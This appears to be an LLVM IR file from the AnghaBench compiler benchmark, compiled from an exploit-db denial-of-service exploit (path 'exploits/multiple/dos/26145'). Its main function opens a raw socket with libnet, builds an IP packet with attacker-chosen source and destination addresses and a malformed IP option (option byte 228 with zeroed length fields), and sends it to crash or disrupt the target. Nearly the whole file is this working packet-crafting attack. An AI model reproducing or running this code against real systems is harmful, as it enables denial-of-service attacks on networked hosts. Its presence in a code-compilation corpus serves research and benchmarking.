; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_26145.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_26145.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ipoption = type { i32* }

@IP_MAXPACKET = common dso_local global i32 0, align 4
@__const.main.payload = private unnamed_addr constant [20 x i8] c"ABCDEFGHIJKLMNOPRST\00", align 16
@OPT_LEN = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [7 x i8] c"d:s:h?\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"Error ip options insertion failed\0A\00", align 1
@LIBNET_IP_H = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [17 x i8] c"Error write_ip \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca [20 x i8], align 16
  %14 = alloca [4 x i32], align 16
  %15 = alloca %struct.ipoption, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @IP_MAXPACKET, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %11, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %12, align 8
  %20 = bitcast [20 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %20, i8* align 16 getelementptr inbounds ([20 x i8], [20 x i8]* @__const.main.payload, i32 0, i32 0), i64 20, i1 false)
  %21 = getelementptr inbounds [4 x i32], [4 x i32]* %14, i64 0, i64 0
  %22 = load i64, i64* @OPT_LEN, align 8
  %23 = call i32 @bzero(i32* %21, i64 %22)
  br label %24

24:                                               ; preds = %44, %2
  %25 = load i32, i32* %4, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = call signext i8 @getopt(i32 %25, i8** %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i8 %27, i8* %6, align 1
  %28 = sext i8 %27 to i32
  %29 = load i8, i8* @EOF, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp ne i32 %28, %30
  br i1 %31, label %32, label %45

32:                                               ; preds = %24
  %33 = load i8, i8* %6, align 1
  %34 = sext i8 %33 to i32
  switch i32 %34, label %44 [
    i32 104, label %35
    i32 115, label %38
    i32 100, label %41
  ]

35:                                               ; preds = %32
  %36 = call i32 (...) @usage()
  %37 = call i32 @exit(i32 1) #5
  unreachable

38:                                               ; preds = %32
  %39 = load i32, i32* @optarg, align 4
  %40 = call i32 @libnet_name_resolve(i32 %39, i32 0)
  store i32 %40, i32* %9, align 4
  br label %44

41:                                               ; preds = %32
  %42 = load i32, i32* @optarg, align 4
  %43 = call i32 @libnet_name_resolve(i32 %42, i32 0)
  store i32 %43, i32* %10, align 4
  br label %44

44:                                               ; preds = %32, %41, %38
  br label %24

45:                                               ; preds = %24
  %46 = load i32, i32* @IPPROTO_RAW, align 4
  %47 = call i32 @libnet_open_raw_sock(i32 %46)
  store i32 %47, i32* %7, align 4
  %48 = load i32, i32* %7, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %53

50:                                               ; preds = %45
  %51 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %52 = call i32 @exit(i32 1) #5
  unreachable

53:                                               ; preds = %45
  %54 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %55 = call i64 @strlen(i8* %54)
  %56 = load i32, i32* %9, align 4
  %57 = load i32, i32* %10, align 4
  %58 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %59 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %60 = call i64 @strlen(i8* %59)
  %61 = call i32 @libnet_build_ip(i64 %55, i32 0, i32 4919, i32 0, i32 255, i32 170, i32 %56, i32 %57, i8* %58, i64 %60, i8* %19)
  %62 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %15, i32 0, i32 0
  %63 = load i32*, i32** %62, align 8
  %64 = getelementptr inbounds [4 x i32], [4 x i32]* %14, i64 0, i64 0
  %65 = load i64, i64* @OPT_LEN, align 8
  %66 = call i32 @memcpy(i32* %63, i32* %64, i64 %65)
  %67 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %15, i32 0, i32 0
  %68 = load i32*, i32** %67, align 8
  store i32 228, i32* %68, align 4
  %69 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %15, i32 0, i32 0
  %70 = load i32*, i32** %69, align 8
  %71 = getelementptr inbounds i32, i32* %70, i64 1
  store i32 0, i32* %71, align 4
  %72 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %15, i32 0, i32 0
  %73 = load i32*, i32** %72, align 8
  %74 = getelementptr inbounds i32, i32* %73, i64 1
  store i32 0, i32* %74, align 4
  %75 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %15, i32 0, i32 0
  %76 = load i32*, i32** %75, align 8
  %77 = getelementptr inbounds i32, i32* %76, i64 1
  store i32 0, i32* %77, align 4
  %78 = load i64, i64* @OPT_LEN, align 8
  %79 = call i32 @libnet_insert_ipo(%struct.ipoption* %15, i64 %78, i8* %19)
  store i32 %79, i32* %8, align 4
  %80 = load i32, i32* %8, align 4
  %81 = icmp slt i32 %80, 0
  br i1 %81, label %82, label %87

82:                                               ; preds = %53
  %83 = load i32, i32* %7, align 4
  %84 = call i32 @libnet_close_raw_sock(i32 %83)
  %85 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %86 = call i32 @exit(i32 1) #5
  unreachable

87:                                               ; preds = %53
  %88 = load i32, i32* %7, align 4
  %89 = load i64, i64* @LIBNET_IP_H, align 8
  %90 = load i64, i64* @OPT_LEN, align 8
  %91 = add nsw i64 %89, %90
  %92 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %93 = call i64 @strlen(i8* %92)
  %94 = add nsw i64 %91, %93
  %95 = call i32 @libnet_write_ip(i32 %88, i8* %19, i64 %94)
  store i32 %95, i32* %8, align 4
  %96 = load i32, i32* %8, align 4
  %97 = icmp slt i32 %96, 0
  br i1 %97, label %98, label %103

98:                                               ; preds = %87
  %99 = load i32, i32* %7, align 4
  %100 = call i32 @libnet_close_raw_sock(i32 %99)
  %101 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %102 = call i32 @exit(i32 1) #5
  unreachable

103:                                              ; preds = %87
  %104 = load i32, i32* %7, align 4
  %105 = call i32 @libnet_close_raw_sock(i32 %104)
  store i32 0, i32* %3, align 4
  %106 = load i8*, i8** %11, align 8
  call void @llvm.stackrestore(i8* %106)
  %107 = load i32, i32* %3, align 4
  ret i32 %107
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @bzero(i32*, i64) #3

declare dso_local signext i8 @getopt(i32, i8**, i8*) #3

declare dso_local i32 @usage(...) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32 @libnet_name_resolve(i32, i32) #3

declare dso_local i32 @libnet_open_raw_sock(i32) #3

declare dso_local i32 @perror(i8*) #3

declare dso_local i32 @libnet_build_ip(i64, i32, i32, i32, i32, i32, i32, i32, i8*, i64, i8*) #3

declare dso_local i64 @strlen(i8*) #3

declare dso_local i32 @memcpy(i32*, i32*, i64) #3

declare dso_local i32 @libnet_insert_ipo(%struct.ipoption*, i64, i8*) #3

declare dso_local i32 @libnet_close_raw_sock(i32) #3

declare dso_local i32 @printf(i8*) #3

declare dso_local i32 @libnet_write_ip(i32, i8*, i64) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
